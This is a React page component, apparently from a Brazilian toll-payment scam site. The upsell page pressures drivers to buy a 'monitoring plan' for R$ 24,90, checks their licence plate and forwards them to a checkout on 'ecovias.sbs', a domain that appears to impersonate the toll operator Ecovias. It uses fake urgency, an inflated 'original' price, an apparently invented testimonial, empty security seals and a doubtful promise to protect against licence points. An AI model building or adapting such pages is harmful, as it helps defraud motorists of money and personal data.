"use client"

import type React from "react"
import { useState } from "react"
import { Header } from "@/components/header"
import { Footer } from "@/components/footer"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { Check, Loader2, Shield, Lock, X } from "lucide-react"

export default function UpsellPage() {
  const [plate, setPlate] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const [vehicleData, setVehicleData] = useState<any>(null)
  const [showConfirmation, setShowConfirmation] = useState(false)

  const isValidPlate = plate.length === 7

  const handleActivate = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")

    if (!isValidPlate) {
      setError("Por favor, digite uma placa válida (7 caracteres).")
      return
    }

    setIsLoading(true)

    try {
      const response = await fetch(`/api/consultar-placa?placa=${plate}`)
      const data = await response.json()

      if (!response.ok) {
        setError(data.error || "Placa não encontrada. Por favor, verifique e tente novamente.")
        setIsLoading(false)
        return
      }

      setVehicleData(data)
      setShowConfirmation(true)
      setIsLoading(false)
    } catch (error) {
      console.error("Erro ao consultar placa:", error)
      setError("Erro ao consultar placa. Por favor, tente novamente.")
      setIsLoading(false)
    }
  }

  const handleConfirmAndCheckout = () => {
    window.location.href = "https://checkout.ecovias.sbs/VCCL1O8SCIKV"
  }

  return (
    <main className="min-h-screen bg-background">
      <Header />

      {/* Progress Indicator */}
      <div className="bg-blue-950 text-white py-3 px-4">
        <div className="container mx-auto">
          <p className="text-sm md:text-base text-center">
            <span className="font-semibold">Passo 2 de 3:</span> Configurando sua conta...
          </p>
        </div>
      </div>

      <section className="container mx-auto px-4 py-8 md:py-12 max-w-4xl">
        {/* Urgency Headline */}
        <div className="text-center mb-8 md:mb-12">
          <h1 className="text-3xl md:text-5xl font-bold text-red-600 mb-4 text-balance">ESPERA! Não saia ainda.</h1>
          <h2 className="text-2xl md:text-4xl font-bold text-white mb-4 text-balance">
            Sua placa pode ser multada nos próximos dias.
          </h2>
          <p className="text-lg md:text-xl text-white text-balance">
            Ative o Plano de Monitoramento por 90 dias e evite multas de{" "}
            <span className="font-bold text-red-600">R$ 195,23</span> por esquecimento.
          </p>
        </div>

        {/* Offer Card */}
        <Card className="bg-white border-2 border-blue-600 shadow-2xl p-6 md:p-10 mb-8">
          <div className="text-center mb-6">
            <h3 className="text-2xl md:text-3xl font-bold text-blue-950 mb-2">Plano Plus: 90 Dias de Blindagem</h3>
            <div className="inline-block bg-yellow-400 text-gray-900 px-4 py-2 rounded-full font-bold text-sm md:text-base">
              OFERTA EXCLUSIVA PÓS-PAGAMENTO
            </div>
          </div>

          {/* Benefits List */}
          <div className="space-y-4 mb-8">
            {[
              "Monitoramento 24h de pórticos Free Flow",
              "Pagamento automático sem taxas de serviço",
              "Avisos imediatos via WhatsApp",
              "Proteção contra 5 pontos na CNH",
            ].map((benefit, index) => (
              <div key={index} className="flex items-start gap-3">
                <div className="flex-shrink-0 w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                  <Check className="w-4 h-4 text-white" />
                </div>
                <p className="text-base md:text-lg text-gray-900">{benefit}</p>
              </div>
            ))}
          </div>

          {/* Pricing */}
          <div className="bg-blue-50 border-2 border-blue-600 rounded-lg p-6 mb-6">
            <div className="text-center">
              <p className="text-gray-600 line-through text-lg md:text-xl mb-2">De R$ 97,00</p>
              <p className="text-4xl md:text-5xl font-bold text-blue-950 mb-2">R$ 24,90</p>
              <p className="text-sm md:text-base text-gray-600">(pagamento único)</p>
            </div>
          </div>

          {/* Plate Input Form */}
          <form onSubmit={handleActivate} className="space-y-4">
            <div>
              <label htmlFor="plate" className="block text-sm font-semibold text-gray-900 mb-2">
                Confirme sua placa para ativar o benefício:
              </label>
              <Input
                id="plate"
                type="text"
                placeholder="DIGITE SUA PLACA"
                value={plate}
                onChange={(e) => {
                  setPlate(e.target.value.toUpperCase())
                  setError("")
                }}
                className="w-full h-12 md:h-14 text-base md:text-lg bg-white border-gray-300 text-gray-900 placeholder:text-gray-400"
                maxLength={7}
                disabled={isLoading}
              />
              {error && <p className="mt-2 text-sm text-red-600 font-medium">{error}</p>}
            </div>

            {/* CTA Button */}
            <Button
              type="submit"
              size="lg"
              disabled={!isValidPlate || isLoading}
              className="w-full h-14 md:h-16 text-lg md:text-xl font-bold bg-green-600 hover:bg-green-700 text-white shadow-lg hover:shadow-xl transition-all animate-pulse disabled:animate-none disabled:bg-gray-400"
            >
              {isLoading ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  Verificando placa...
                </>
              ) : (
                "SIM! QUERO ATIVAR POR R$ 24,90"
              )}
            </Button>
          </form>
        </Card>

        {/* Testimonial */}
        <Card className="bg-blue-50 border border-blue-200 p-6 mb-8">
          <div className="flex items-start gap-4">
            <div className="flex-shrink-0 w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold text-xl">
              JP
            </div>
            <div>
              <p className="text-gray-900 italic mb-2">
                "Evitei uma multa na primeira semana de uso. Vale cada centavo."
              </p>
              <p className="text-sm text-gray-600 font-semibold">- João P.</p>
            </div>
          </div>
        </Card>

        {/* Security Seals */}
        <div className="flex flex-wrap items-center justify-center gap-6 text-center">
          <div className="flex items-center gap-2">
            <Lock className="w-5 h-5 text-green-600" />
            <span className="text-sm text-white font-medium">Criptografia 256-bit</span>
          </div>
          <div className="flex items-center gap-2">
            <Shield className="w-5 h-5 text-green-600" />
            <span className="text-sm text-white font-medium">Compra Garantida</span>
          </div>
        </div>
      </section>

      {showConfirmation && vehicleData && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50">
          <Card className="bg-white max-w-md w-full p-6 md:p-8 relative">
            <button
              onClick={() => setShowConfirmation(false)}
              className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 transition-colors"
              type="button"
            >
              <X className="w-6 h-6" />
            </button>

            <div className="text-center mb-6">
              <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
                <Check className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-2">Veículo Confirmado!</h3>
              <p className="text-gray-600">Dados verificados com sucesso</p>
            </div>

            <div className="space-y-3 mb-6 bg-gray-50 rounded-lg p-4">
              <div className="flex justify-between">
                <span className="text-gray-600 font-medium">Placa:</span>
                <span className="text-gray-900 font-bold">{vehicleData.PLACA || vehicleData.placa || plate}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600 font-medium">Marca/Modelo:</span>
                <span className="text-gray-900 font-bold">
                  {vehicleData.MARCA_MODELO || vehicleData.MARCA || "N/A"}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600 font-medium">Cor:</span>
                <span className="text-gray-900 font-bold">{vehicleData.COR || vehicleData.cor || "N/A"}</span>
              </div>
            </div>

            <Button
              onClick={handleConfirmAndCheckout}
              size="lg"
              className="w-full h-14 text-lg font-bold bg-green-600 hover:bg-green-700 text-white"
            >
              Confirmar e Ir para Pagamento
            </Button>
          </Card>
        </div>
      )}

      <Footer />
    </main>
  )
}
